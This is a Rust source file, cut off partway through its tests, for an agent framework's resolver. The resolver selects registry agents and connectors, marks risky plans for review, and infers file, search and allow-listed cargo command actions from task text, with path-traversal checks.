use crate::registry::Registry;
use crate::types::{
    AutopilotJob, ExecutionPlan, ExtendedResolution, PlannedAction, Resolution, ResolutionInput,
};
use async_trait::async_trait;
use cyberclaw_core::manifests::PackageKind;
use cyberclaw_core::prelude::{CapabilityId, ConnectorId, Task};
use cyberclaw_core::task::TaskKind;
use std::sync::Arc;

/// Security: Maximum length for task titles and summaries to prevent DoS
const MAX_TASK_TITLE_LENGTH: usize = 512;
const MAX_TASK_SUMMARY_LENGTH: usize = 4096;

/// Security: Sanitize string for safe logging by removing control characters.
/// Prevents log injection attacks via newlines and other control chars.
fn sanitize_for_log(s: &str) -> String {
    s.chars()
        .filter(|c| !c.is_control() || *c == ' ')
        .take(1024) // Limit length to prevent log flooding
        .collect()
}

#[async_trait]
pub trait Resolver: Send + Sync {
    async fn resolve(&self, input: ResolutionInput) -> anyhow::Result<Resolution>;
    async fn plan(&self, input: ResolutionInput) -> anyhow::Result<ExecutionPlan>;

    // Agent 6: Extended resolution with Autopilot support
    async fn resolve_extended(&self, input: ResolutionInput) -> anyhow::Result<ExtendedResolution>;
}

#[derive(Clone)]
pub struct InMemoryResolver {
    registry: Arc<dyn Registry>,
}

impl InMemoryResolver {
    pub fn new(registry: Arc<dyn Registry>) -> Self {
        Self { registry }
    }

    // ============ Agent 6: Autopilot Detection ============

    /// Check if the task represents an Autopilot request
    fn is_autopilot_task(task: &Task) -> bool {
        // Method 1: Task kind is explicitly Autopilot
        if task.kind == TaskKind::Autopilot {
            return true;
        }

        // Method 2: Payload contains "autopilot: true"
        if let Some(autopilot) = task.input.payload.get("autopilot") {
            if autopilot.as_bool() == Some(true) {
                return true;
            }
        }

        // Method 3: Payload contains "mode: autopilot"
        if let Some(mode) = task.input.payload.get("mode") {
            if mode.as_str() == Some("autopilot") {
                return true;
            }
        }

        false
    }

    /// Extract Autopilot job metadata from task input
    fn create_autopilot_job(task: &Task) -> anyhow::Result<AutopilotJob> {
        let payload = &task.input.payload;

        // Extract goal (required)
        let goal = payload
            .get("goal")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow::anyhow!("Autopilot task missing 'goal' field in payload"))?
            .to_string();

        // Extract max_iterations (optional, default 50)
        let max_iterations = u32::try_from(
            payload
                .get("max_iterations")
                .and_then(|v| v.as_u64())
                .unwrap_or(50),
        )
        .unwrap_or(50);

        // Extract review_gates (optional)
        let review_gates = payload
            .get("review_gates")
            .and_then(|v| v.as_array())
            .map(|arr| {
                arr.iter()
                    .filter_map(|v| v.as_str().map(|s| s.to_string()))
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default();

        // Generate job ID from task ID
        let job_id = format!("autopilot-{}", task.id.as_str());

        Ok(AutopilotJob {
            job_id,
            goal,
            max_iterations,
            review_gates,
            created_at: chrono::Utc::now(),
        })
    }
}

#[async_trait]
impl Resolver for InMemoryResolver {
    async fn resolve_extended(&self, input: ResolutionInput) -> anyhow::Result<ExtendedResolution> {
        // Check if this is an Autopilot task
        let autopilot_job = if Self::is_autopilot_task(&input.task) {
            Some(Self::create_autopilot_job(&input.task)?)
        } else {
            None
        };

        // Perform standard resolution
        let base = self.resolve(input).await?;

        Ok(ExtendedResolution {
            base,
            autopilot_job,
            // Sprint D3: legacy resolver does not synthesize a Story DAG. The
            // dedicated `PersistentStoryPlanner` (see
            // `crate::persistent_story_planner`) is responsible for populating
            // this when the request runs in `ExecutionMode::Persistent`.
            persistent_plan: None,
        })
    }

    async fn resolve(&self, input: ResolutionInput) -> anyhow::Result<Resolution> {
        // Security: Input validation to prevent DoS and injection
        if input.task.title.len() > MAX_TASK_TITLE_LENGTH {
            anyhow::bail!(
                "Task title exceeds maximum length of {} characters",
                MAX_TASK_TITLE_LENGTH
            );
        }
        if input.task.summary.len() > MAX_TASK_SUMMARY_LENGTH {
            anyhow::bail!(
                "Task summary exceeds maximum length of {} characters",
                MAX_TASK_SUMMARY_LENGTH
            );
        }

        let mut reasons = Vec::new();
        // Security: Sanitize task title for logging
        reasons.push(format!("task: {}", sanitize_for_log(&input.task.title)));
        reasons.push(format!("task kind: {:?}", input.task.kind));

        // 从 registry 获取所有 active packages
        let agent_records = self.registry.list(Some(PackageKind::Agent)).await?;
        let skill_records = self.registry.list(Some(PackageKind::Skill)).await?;
        let connector_records = self.registry.list(Some(PackageKind::Connector)).await?;

        reasons.push(format!(
            "registry status: {} agents, {} skills, {} connectors",
            agent_records.len(),
            skill_records.len(),
            connector_records.len()
        ));

        // 选择 agent：优先从 registry 中选择，否则使用第一个可用的
        let selected_agent = input
            .available_agents
            .iter()
            .find(|agent_id| {
                let found = agent_records.iter().any(|rec| rec.id == agent_id.as_str());
                if found {
                    reasons.push(format!("selected agent '{}' from registry", agent_id));
                }
                found
            })
            .or_else(|| {
                input.available_agents.first().inspect(|agent_id| {
                    reasons.push(format!(
                        "fallback to first available agent '{}' (not in registry)",
                        agent_id
                    ));
                })
            })
            .cloned()
            .ok_or_else(|| anyhow::anyhow!("no agent available for resolution"))?;

        // 验证并过滤 skills：只使用在 registry 中存在的
        let selected_skills: Vec<_> = input
            .available_skills
            .iter()
            .filter(|skill_id| {
                let found = skill_records.iter().any(|rec| rec.id == skill_id.as_str());
                if found {
                    reasons.push(format!("included skill '{}' from registry", skill_id));
                } else {
                    reasons.push(format!("skipped skill '{}' (not in registry)", skill_id));
                }
                found
            })
            .cloned()
            .collect();

        // 验证并过滤 connectors：只使用在 registry 中存在的
        let selected_connectors: Vec<_> = input
            .available_connectors
            .iter()
            .filter(|conn_id| {
                let found = connector_records
                    .iter()
                    .any(|rec| rec.id == conn_id.as_str());
                if found {
                    reasons.push(format!("included connector '{}' from registry", conn_id));
                } else {
                    reasons.push(format!("skipped connector '{}' (not in registry)", conn_id));
                }
                found
            })
            .cloned()
            .collect();

        let workflow = input.available_workflows.first().cloned();
        if let Some(wf) = &workflow {
            reasons.push(format!("selected workflow: {:?}", wf));
        }

        // 从 registry 提取所有可用的 capabilities（来自 connectors）
        let mut available_capability_ids = std::collections::HashSet::new();
        for conn_rec in &connector_records {
            if let Some(connector_spec) = conn_rec.manifest.connector_spec() {
                for cap in &connector_spec.capabilities {
                    available_capability_ids.insert(cap.id.clone());
                }
            }
        }

        // 验证并过滤 capabilities：只使用在 registry 中存在的
        let selected_capabilities: Vec<_> = input
            .available_capabilities
            .iter()
            .filter(|cap_id| {
                let found = available_capability_ids.contains(&cap_id.to_string());
                if found {
                    reasons.push(format!("included capability '{}' from registry", cap_id));
                } else {
                    reasons.push(format!(
                        "skipped capability '{}' (not available in registry)",
                        cap_id
                    ));
                }
                found
            })
            .cloned()
            .collect();

        reasons.push(format!(
            "capabilities: {} selected from {} requested",
            selected_capabilities.len(),
            input.available_capabilities.len()
        ));

        Ok(Resolution {
            agent: selected_agent,
            skills: selected_skills,
            workflow,
            connectors: selected_connectors,
            capabilities: selected_capabilities,
            reasons,
        })
    }

    async fn plan(&self, input: ResolutionInput) -> anyhow::Result<ExecutionPlan> {
        let resolution = self.resolve(input.clone()).await?;

        // 收集所有 connector 的 capabilities 以评估 risk
        let connector_records = self.registry.list(Some(PackageKind::Connector)).await?;

        let mut capability_contracts = std::collections::HashMap::new();
        for conn_rec in &connector_records {
            if let Some(connector_spec) = conn_rec.manifest.connector_spec() {
                for cap in &connector_spec.capabilities {
                    capability_contracts.insert(cap.id.clone(), cap.clone());
                }
            }
        }

        // 评估最高风险等级
        use cyberclaw_core::prelude::RiskLevel;
        let mut max_risk = RiskLevel::Low;
        for cap_id in &resolution.capabilities {
            if let Some(contract) = capability_contracts.get(&cap_id.to_string()) {
                max_risk = std::cmp::max(max_risk, contract.risk);
            }
        }

        // risk >= Medium 时自动要求审批
        let review_required = matches!(
            max_risk,
            RiskLevel::Medium | RiskLevel::High | RiskLevel::Critical
        );

        // P0/P1: Action generation based on explicit TaskInput or intelligent inference
        //
        // Generates actions using two methods:
        // 1. Explicit: When TaskInput.payload explicitly specifies:
        //    - "capability": name of the capability to execute (e.g., "fs.read")
        //    - "params": parameters for the capability (optional)
        //
        // 2. Inference: Analyzes task.title and task.summary to determine intent
        //    and generate appropriate actions with parameters
        //
        // If no matching capability is found, returns empty actions and
        // falls back to agent/skill runtime for dynamic execution.
        //
        // Future P2+: Advanced planning with LLM/rule engine for
        // multi-step execution plans.
        //
        // Reference: docs/ARCHITECTURE_V2.0.md - "Planning & Resolution" section
        let actions = generate_minimal_actions(
            &input.task,
            &resolution.connectors,
            &resolution.capabilities,
        )?;

        tracing::debug!(
            "Generated execution plan: {} connectors, {} capabilities, review_required={}, actions={}",
            resolution.connectors.len(),
            resolution.capabilities.len(),
            review_required,
            actions.len()
        );

        Ok(ExecutionPlan {
            resolution,
            actions,
            review_required,
            max_fix_loops: crate::types::default_max_fix_loops(),
            expected_outcomes: vec![],
        })
    }
}

/// Generate actions based on TaskInput or intelligent inference from task content
///
/// This function generates PlannedActions using two methods:
/// 1. Explicit: When TaskInput.payload contains a "capability" field
/// 2. Inference: Analyzes task.title and task.summary to determine appropriate actions
///
/// Inference logic examples:
/// - "Read README.md" -> fs.read with path "README.md"
/// - "Search for TODO" -> search.grep with pattern "TODO"
/// - "List all Python files" -> search.glob with pattern "**/*.py"
/// - "Run tests" -> cmd.exec with command "cargo test"
///
/// Returns at least one action for tasks that match LocalConnector capabilities,
/// or empty Vec if no matching capability can be inferred.
fn generate_minimal_actions(
    task: &Task,
    connectors: &[ConnectorId],
    capabilities: &[CapabilityId],
) -> anyhow::Result<Vec<PlannedAction>> {
    // Method 1: Check for explicit capability request in TaskInput
    let requested_capability = task
        .input
        .payload
        .get("capability")
        .and_then(|v| v.as_str());

    if let Some(cap) = requested_capability {
        // Explicit capability specified - use original logic
        let capability_id = CapabilityId::from_string(cap.to_string())
            .map_err(|_| anyhow::anyhow!("Invalid capability ID: {}", cap))?;

        if !capabilities.contains(&capability_id) {
            return Err(anyhow::anyhow!(
                "Requested capability '{}' not available in resolution. Available: {:?}",
                cap,
                capabilities
            ));
        }

        let connector_id = ConnectorId::from_string("local".to_string())
            .map_err(|_| anyhow::anyhow!("Failed to create connector ID"))?;

        if !connectors.contains(&connector_id) {
            return Err(anyhow::anyhow!(
                "Connector 'local' not available in resolution. Available: {:?}",
                connectors
            ));
        }

        let params = task
            .input
            .payload
            .get("params")
            .cloned()
            .unwrap_or(serde_json::json!({}));

        if !params.is_object() {
            return Err(anyhow::anyhow!(
                "Task input 'params' must be an object, got: {}",
                params
            ));
        }

        return Ok(vec![PlannedAction {
            connector_id,
            capability: capability_id,
            input: params,
            reason: format!("Execute '{}' as explicitly requested in task input", cap),
        }]);
    }

    // Method 2: Intelligent inference from task title and summary
    let title = &task.title.to_lowercase();
    let summary = &task.summary.to_lowercase();

    // Combine title and summary for analysis
    let task_text = format!("{} {}", title, summary);

    // Helper function to check if capability is available
    let is_capability_available = |cap: &str| {
        let cap_id = CapabilityId::from_string(cap.to_string());
        cap_id.is_ok() && capabilities.contains(&cap_id.unwrap())
    };

    // Helper to create local connector ID
    let connector_id = ConnectorId::from_string("local".to_string())
        .map_err(|_| anyhow::anyhow!("Failed to create connector ID"))?;

    if !connectors.contains(&connector_id) {
        // Local connector not available, can't infer actions
        return Ok(Vec::new());
    }

    // Inference patterns for each capability

    // 1. File system operations
    if task_text.contains("read")
        && (task_text.contains("file") || task_text.contains("."))
        && is_capability_available("fs.read")
    {
        // Try to extract file path from task text
        let path = extract_file_path(&task.title, &task.summary).unwrap_or("README.md".to_string());

        return Ok(vec![PlannedAction {
            connector_id,
            capability: CapabilityId::from_string("fs.read".to_string()).unwrap(),
            input: serde_json::json!({
                "path": path
            }),
            reason: format!("Inferred fs.read from task: read file '{}'", path),
        }]);
    }

    if task_text.contains("write")
        && (task_text.contains("file") || task_text.contains("create"))
        && is_capability_available("fs.write")
    {
        let path =
            extract_file_path(&task.title, &task.summary).unwrap_or("output.txt".to_string());

        return Ok(vec![PlannedAction {
            connector_id,
            capability: CapabilityId::from_string("fs.write".to_string()).unwrap(),
            input: serde_json::json!({
                "path": path,
                "content": ""
            }),
            reason: format!("Inferred fs.write from task: write to file '{}'", path),
        }]);
    }

    if (task_text.contains("edit") || task_text.contains("modify") || task_text.contains("update"))
        && task_text.contains("file")
        && is_capability_available("fs.edit")
    {
        let path = extract_file_path(&task.title, &task.summary).unwrap_or("file.txt".to_string());

        return Ok(vec![PlannedAction {
            connector_id,
            capability: CapabilityId::from_string("fs.edit".to_string()).unwrap(),
            input: serde_json::json!({
                "path": path,
                "old_string": "",
                "new_string": ""
            }),
            reason: format!("Inferred fs.edit from task: edit file '{}'", path),
        }]);
    }

    // 2. Search operations
    if (task_text.contains("search") || task_text.contains("find") || task_text.contains("grep"))
        && task_text.contains("for ")
        && is_capability_available("search.grep")
    {
        // Extract search pattern
        let pattern = extract_search_pattern(&task_text).unwrap_or("TODO".to_string());

        return Ok(vec![PlannedAction {
            connector_id,
            capability: CapabilityId::from_string("search.grep".to_string()).unwrap(),
            input: serde_json::json!({
                "pattern": pattern,
                "path": "."
            }),
            reason: format!("Inferred search.grep from task: search for '{}'", pattern),
        }]);
    }

    if (task_text.contains("list") || task_text.contains("find"))
        && task_text.contains("files")
        && is_capability_available("search.glob")
    {
        // Extract file pattern
        let pattern = extract_glob_pattern(&task_text).unwrap_or("*".to_string());

        return Ok(vec![PlannedAction {
            connector_id,
            capability: CapabilityId::from_string("search.glob".to_string()).unwrap(),
            input: serde_json::json!({
                "pattern": pattern
            }),
            reason: format!(
                "Inferred search.glob from task: find files matching '{}'",
                pattern
            ),
        }]);
    }

    // 3. Command execution
    if (task_text.contains("run") || task_text.contains("execute") || task_text.contains("exec"))
        && is_capability_available("cmd.exec")
    {
        // Extract command
        let command = extract_command(&task_text).unwrap_or("echo 'Hello World'".to_string());

        return Ok(vec![PlannedAction {
            connector_id,
            capability: CapabilityId::from_string("cmd.exec".to_string()).unwrap(),
            input: serde_json::json!({
                "command": command,
                "cwd": "."
            }),
            reason: format!("Inferred cmd.exec from task: execute '{}'", command),
        }]);
    }

    // If common development tasks are mentioned
    if task_text.contains("test") && is_capability_available("cmd.exec") {
        return Ok(vec![PlannedAction {
            connector_id,
            capability: CapabilityId::from_string("cmd.exec".to_string()).unwrap(),
            input: serde_json::json!({
                "command": "cargo test",
                "cwd": "."
            }),
            reason: "Inferred cmd.exec from task: run tests".to_string(),
        }]);
    }

    if task_text.contains("build") && is_capability_available("cmd.exec") {
        return Ok(vec![PlannedAction {
            connector_id,
            capability: CapabilityId::from_string("cmd.exec".to_string()).unwrap(),
            input: serde_json::json!({
                "command": "cargo build",
                "cwd": "."
            }),
            reason: "Inferred cmd.exec from task: build project".to_string(),
        }]);
    }

    // No matching capability found - return empty actions for fallback
    Ok(Vec::new())
}

/// Extract file path from title or summary with strict validation
///
/// SECURITY: Only accepts safe paths, rejects traversal attempts.
/// This is the first layer of defense - downstream validate_path() also checks.
fn extract_file_path(title: &str, summary: &str) -> Option<String> {
    // Look for file paths with extensions
    let combined = format!("{} {}", title, summary);

    // Simple regex-like pattern matching for file paths
    for word in combined.split_whitespace() {
        // Check if word looks like a file path (contains dot and extension)
        if word.contains('.') && !word.starts_with('.') {
            // Clean up common punctuation
            let cleaned = word.trim_matches(|c: char| {
                !c.is_alphanumeric() && c != '.' && c != '/' && c != '_' && c != '-'
            });

            if cleaned.is_empty() {
                continue;
            }

            // SECURITY: Reject paths with traversal sequences
            if cleaned.contains("..") {
                tracing::warn!(
                    "Rejected unsafe path pattern in inference (contains '..'): {}",
                    cleaned
                );
                continue;
            }

            // SECURITY: Reject absolute paths
            if cleaned.starts_with('/') {
                tracing::warn!(
                    "Rejected unsafe path pattern in inference (absolute path): {}",
                    cleaned
                );
                continue;
            }

            // SECURITY: Reject paths with double slashes
            if cleaned.contains("//") {
                tracing::warn!(
                    "Rejected unsafe path pattern in inference (contains '//'): {}",
                    cleaned
                );
                continue;
            }

            // SECURITY: Limit path components to prevent deep traversal
            let component_count = cleaned.split('/').count();
            if component_count > 5 {
                tracing::warn!(
                    "Rejected path with too many components ({} > 5): {}",
                    component_count,
                    cleaned
                );
                continue;
            }

            return Some(cleaned.to_string());
        }
    }

    None
}

/// Extract search pattern from task text
fn extract_search_pattern(text: &str) -> Option<String> {
    // Look for pattern after "for" or "search"
    // Note: text is already lowercased, so we look for "todo" not "TODO"
    if let Some(idx) = text.find("for ") {
        let after_for = &text[idx + 4..];
        // Look for "todo" or other patterns
        if after_for.starts_with("todo") {
            return Some("TODO".to_string()); // Return uppercase version for common patterns
        }

        // Take first word or quoted string
        let pattern = after_for
            .split_whitespace()
            .next()
            .or_else(|| after_for.split('"').nth(1));

        if let Some(p) = pattern {
            // Remove only trailing punctuation, preserve the word itself
            let cleaned =
                p.trim_end_matches(|c: char| !c.is_alphanumeric() && c != '_' && c != '-');
            if !cleaned.is_empty() {
                // For common patterns, use uppercase
                return Some(match cleaned {
                    "todo" => "TODO".to_string(),
                    "fixme" => "FIXME".to_string(),
                    "bug" => "BUG".to_string(),
                    "hack" => "HACK".to_string(),
                    _ => cleaned.to_string(),
                });
            }
        }
    }

    None
}

/// Extract glob pattern from task text
fn extract_glob_pattern(text: &str) -> Option<String> {
    // Look for common file type mentions
    if text.contains("python") || text.contains(".py") {
        return Some("**/*.py".to_string());
    }
    if text.contains("rust") || text.contains(".rs") {
        return Some("**/*.rs".to_string());
    }
    if text.contains("javascript") || text.contains(".js") {
        return Some("**/*.js".to_string());
    }
    if text.contains("typescript") || text.contains(".ts") {
        return Some("**/*.ts".to_string());
    }
    if text.contains("markdown") || text.contains(".md") {
        return Some("**/*.md".to_string());
    }
    if text.contains("json") {
        return Some("**/*.json".to_string());
    }
    if text.contains("yaml") || text.contains("yml") {
        return Some("**/*.{yaml,yml}".to_string());
    }

    // Look for "all X files" pattern
    if text.contains("all") && text.contains("files") {
        return Some("**/*".to_string());
    }

    None
}

/// Extract command from task text with strict validation
///
/// SECURITY: Returns only whitelisted commands, rejects any user input
/// that doesn't match known safe patterns. This is the first layer of
/// defense - downstream cmd.exec also has its own whitelist and validation.
fn extract_command(text: &str) -> Option<String> {
    // SECURITY: Whitelist of allowed command patterns (aligned with cmd.exec whitelist)
    // We only infer commands that are known to be safe
    const ALLOWED_COMMAND_PATTERNS: &[(&str, &str)] = &[
        ("cargo test", "test"),
        ("cargo test", "tests"),
        ("cargo build", "build"),
        ("cargo check", "check"),
        ("cargo fmt", "format"),
        ("cargo fmt", "fmt"),
        ("cargo clippy", "clippy"),
        ("cargo clippy", "lint"),
    ];

    // Match against whitelist only
    for (command, keyword) in ALLOWED_COMMAND_PATTERNS {
        if text.contains(keyword) {
            return Some((*command).to_string());
        }
    }

    // SECURITY: Reject any input that doesn't match whitelist
    // Do NOT try to extract arbitrary commands from user input
    // If no safe pattern matches, return None and let agent runtime handle it
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ecosystem_scanner::EcosystemScanner;
    use crate::registry::InMemoryRegistry;
    use cyberclaw_core::enums::Priority;
    use cyberclaw_core::identity::{ActorRef, ActorType};
    use cyberclaw_core::ids::{ActorId, AgentId, CapabilityId, ConnectorId, SkillId, TaskId};
    use cyberclaw_core::task::{Task, TaskInput, TaskKind, TriggerRef};

    #[tokio::test]
    async fn test_resolver_with_registry() {
        // 加载 ecosystem 到 registry
        let scanner = EcosystemScanner::new("../../ecosystem");
        let packages = scanner.scan_all().await.unwrap();

        let registry = Arc::new(InMemoryRegistry::new());
        registry.load_packages(packages).await.unwrap();

        // 创建 resolver
        let resolver = InMemoryResolver::new(registry);

        // 创建一个测试 task
        let task = Task {
            id: TaskId::from_string("test-task-001".to_string()).unwrap(),
            case_id: None,
            title: "Test Analysis Task".to_string(),
            summary: "This is a test task for analysis".to_string(),
            kind: TaskKind::Analysis,
            priority: Priority::High,
            requested_by: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            requested_at: chrono::Utc::now(),
            trigger: TriggerRef {
                kind: "manual".to_string(),
                source: "test".to_string(),
            },
            input: TaskInput::default(),
            desired_outputs: vec![],
            labels: vec![],
            preferred_agent_id: None,
        };

        let resolution_input = ResolutionInput {
            task,
            case: None,
            actor: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            workspace: None,
            session: None,
            available_agents: vec![
                AgentId::from_string("cyberclaw/master-agent".to_string()).unwrap()
            ],
            available_skills: vec![SkillId::from_string("report-summary".to_string()).unwrap()],
            available_connectors: vec![ConnectorId::from_string("github".to_string()).unwrap()],
            available_capabilities: vec![CapabilityId::from_string(
                "github.issue.create".to_string(),
            )
            .unwrap()],
            available_workflows: vec![],
        };

        let resolution = resolver.resolve(resolution_input).await;
        assert!(
            resolution.is_ok(),
            "resolution failed: {:?}",
            resolution.err()
        );

        let resolution = resolution.unwrap();
        assert_eq!(resolution.agent.as_str(), "cyberclaw/master-agent");
        assert!(!resolution.skills.is_empty());
        assert!(!resolution.connectors.is_empty());
        assert!(!resolution.reasons.is_empty());
    }

    #[tokio::test]
    async fn test_resolver_plan() {
        let scanner = EcosystemScanner::new("../../ecosystem");
        let packages = scanner.scan_all().await.unwrap();

        let registry = Arc::new(InMemoryRegistry::new());
        registry.load_packages(packages).await.unwrap();

        let resolver = InMemoryResolver::new(registry);

        let task = Task {
            id: TaskId::from_string("test-task-002".to_string()).unwrap(),
            case_id: None,
            title: "Test Execution Task".to_string(),
            summary: "This is a test task for execution".to_string(),
            kind: TaskKind::Execution,
            priority: Priority::Medium,
            requested_by: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            requested_at: chrono::Utc::now(),
            trigger: TriggerRef {
                kind: "manual".to_string(),
                source: "test".to_string(),
            },
            input: TaskInput::default(),
            desired_outputs: vec![],
            labels: vec![],
            preferred_agent_id: None,
        };

        let resolution_input = ResolutionInput {
            task,
            case: None,
            actor: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            workspace: None,
            session: None,
            available_agents: vec![
                AgentId::from_string("cyberclaw/master-agent".to_string()).unwrap()
            ],
            available_skills: vec![],
            available_connectors: vec![ConnectorId::from_string("github".to_string()).unwrap()],
            available_capabilities: vec![CapabilityId::from_string(
                "github.issue.create".to_string(),
            )
            .unwrap()],
            available_workflows: vec![],
        };

        let plan = resolver.plan(resolution_input).await;
        assert!(plan.is_ok(), "plan generation failed: {:?}", plan.err());

        let plan = plan.unwrap();
        assert_eq!(plan.resolution.agent.as_str(), "cyberclaw/master-agent");
        // P0-1 修复后，generate_minimal_actions() 可推断场景会生成 actions
        // 无匹配推断模式时返回空 Vec 作为 fallback（由 agent runtime 处理）
        // 注：此测试未指定 capability，因此 actions 可能为空
    }

    #[tokio::test]
    async fn test_generate_minimal_actions_directly() {
        use cyberclaw_core::task::TaskInput;

        // Test direct call to generate_minimal_actions
        let task = Task {
            id: TaskId::from_string("test-direct".to_string()).unwrap(),
            case_id: None,
            title: "Read README.md".to_string(),
            summary: "Read the content of README.md file".to_string(),
            kind: TaskKind::Execution,
            priority: Priority::Medium,
            requested_by: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            requested_at: chrono::Utc::now(),
            trigger: TriggerRef {
                kind: "manual".to_string(),
                source: "test".to_string(),
            },
            input: TaskInput::default(),
            desired_outputs: vec![],
            labels: vec![],
            preferred_agent_id: None,
        };

        let connectors = vec![ConnectorId::from_string("local".to_string()).unwrap()];
        let capabilities = vec![
            CapabilityId::from_string("fs.read".to_string()).unwrap(),
            CapabilityId::from_string("fs.write".to_string()).unwrap(),
        ];

        let actions = generate_minimal_actions(&task, &connectors, &capabilities).unwrap();

        assert!(!actions.is_empty(), "Expected actions for fs.read task");
        assert_eq!(actions[0].capability.as_str(), "fs.read");
        assert!(actions[0].input.get("path").is_some());
        assert_eq!(
            actions[0].input.get("path").unwrap().as_str(),
            Some("README.md")
        );
    }

    #[tokio::test]
    async fn test_resolver_generates_actions_for_basic_task() {
        // Create a mock registry with minimal setup
        let registry = Arc::new(InMemoryRegistry::new());

        // Create resolver
        let _resolver = InMemoryResolver::new(registry.clone());

        // Test 1: Read file task
        let task = Task {
            id: TaskId::from_string("test-read-task".to_string()).unwrap(),
            case_id: None,
            title: "Read README.md".to_string(),
            summary: "Read the content of README.md file".to_string(),
            kind: TaskKind::Execution,
            priority: Priority::Medium,
            requested_by: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            requested_at: chrono::Utc::now(),
            trigger: TriggerRef {
                kind: "manual".to_string(),
                source: "test".to_string(),
            },
            input: TaskInput::default(),
            desired_outputs: vec![],
            labels: vec![],
            preferred_agent_id: None,
        };

        // Direct test of generate_minimal_actions
        let connectors = vec![ConnectorId::from_string("local".to_string()).unwrap()];
        let capabilities = vec![
            CapabilityId::from_string("fs.read".to_string()).unwrap(),
            CapabilityId::from_string("fs.write".to_string()).unwrap(),
            CapabilityId::from_string("fs.edit".to_string()).unwrap(),
            CapabilityId::from_string("search.grep".to_string()).unwrap(),
            CapabilityId::from_string("search.glob".to_string()).unwrap(),
            CapabilityId::from_string("cmd.exec".to_string()).unwrap(),
        ];

        let actions = generate_minimal_actions(&task, &connectors, &capabilities);
        assert!(
            actions.is_ok(),
            "generate_minimal_actions failed: {:?}",
            actions.err()
        );

        let actions = actions.unwrap();
        assert!(!actions.is_empty(), "Expected actions for fs.read task");
        assert_eq!(actions[0].capability.as_str(), "fs.read");
        assert!(actions[0].input.get("path").is_some());
        assert_eq!(
            actions[0].input.get("path").unwrap().as_str(),
            Some("README.md")
        );
    }

    #[tokio::test]
    async fn test_resolver_infers_search_actions() {
        use cyberclaw_core::task::TaskInput;

        // Test search.grep inference
        let task = Task {
            id: TaskId::from_string("test-search-task".to_string()).unwrap(),
            case_id: None,
            title: "Search for TODO comments".to_string(),
            summary: "Find all TODO comments in the codebase".to_string(),
            kind: TaskKind::Execution,
            priority: Priority::Medium,
            requested_by: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            requested_at: chrono::Utc::now(),
            trigger: TriggerRef {
                kind: "manual".to_string(),
                source: "test".to_string(),
            },
            input: TaskInput::default(),
            desired_outputs: vec![],
            labels: vec![],
            preferred_agent_id: None,
        };

        let connectors = vec![ConnectorId::from_string("local".to_string()).unwrap()];
        let capabilities = vec![CapabilityId::from_string("search.grep".to_string()).unwrap()];

        let actions = generate_minimal_actions(&task, &connectors, &capabilities).unwrap();

        assert!(!actions.is_empty(), "Expected actions for search task");
        assert_eq!(actions[0].capability.as_str(), "search.grep");
        assert!(actions[0].input.get("pattern").is_some());
        assert_eq!(
            actions[0].input.get("pattern").unwrap().as_str(),
            Some("TODO")
        );
    }

    #[tokio::test]
    async fn test_resolver_infers_glob_actions() {
        use cyberclaw_core::task::TaskInput;

        // Test search.glob inference
        let task = Task {
            id: TaskId::from_string("test-glob-task".to_string()).unwrap(),
            case_id: None,
            title: "List all Python files".to_string(),
            summary: "Find all Python files in the project".to_string(),
            kind: TaskKind::Execution,
            priority: Priority::Medium,
            requested_by: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            requested_at: chrono::Utc::now(),
            trigger: TriggerRef {
                kind: "manual".to_string(),
                source: "test".to_string(),
            },
            input: TaskInput::default(),
            desired_outputs: vec![],
            labels: vec![],
            preferred_agent_id: None,
        };

        let connectors = vec![ConnectorId::from_string("local".to_string()).unwrap()];
        let capabilities = vec![CapabilityId::from_string("search.glob".to_string()).unwrap()];

        let actions = generate_minimal_actions(&task, &connectors, &capabilities).unwrap();

        assert!(!actions.is_empty(), "Expected actions for glob task");
        assert_eq!(actions[0].capability.as_str(), "search.glob");
        assert!(actions[0].input.get("pattern").is_some());
        assert_eq!(
            actions[0].input.get("pattern").unwrap().as_str(),
            Some("**/*.py")
        );
    }

    #[tokio::test]
    async fn test_resolver_infers_cmd_exec_actions() {
        use cyberclaw_core::task::TaskInput;

        // Test cmd.exec inference
        let task = Task {
            id: TaskId::from_string("test-cmd-task".to_string()).unwrap(),
            case_id: None,
            title: "Run tests".to_string(),
            summary: "Execute the test suite".to_string(),
            kind: TaskKind::Execution,
            priority: Priority::Medium,
            requested_by: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            requested_at: chrono::Utc::now(),
            trigger: TriggerRef {
                kind: "manual".to_string(),
                source: "test".to_string(),
            },
            input: TaskInput::default(),
            desired_outputs: vec![],
            labels: vec![],
            preferred_agent_id: None,
        };

        let connectors = vec![ConnectorId::from_string("local".to_string()).unwrap()];
        let capabilities = vec![CapabilityId::from_string("cmd.exec".to_string()).unwrap()];

        let actions = generate_minimal_actions(&task, &connectors, &capabilities).unwrap();

        assert!(!actions.is_empty(), "Expected actions for cmd task");
        assert_eq!(actions[0].capability.as_str(), "cmd.exec");
        assert!(actions[0].input.get("command").is_some());
        assert_eq!(
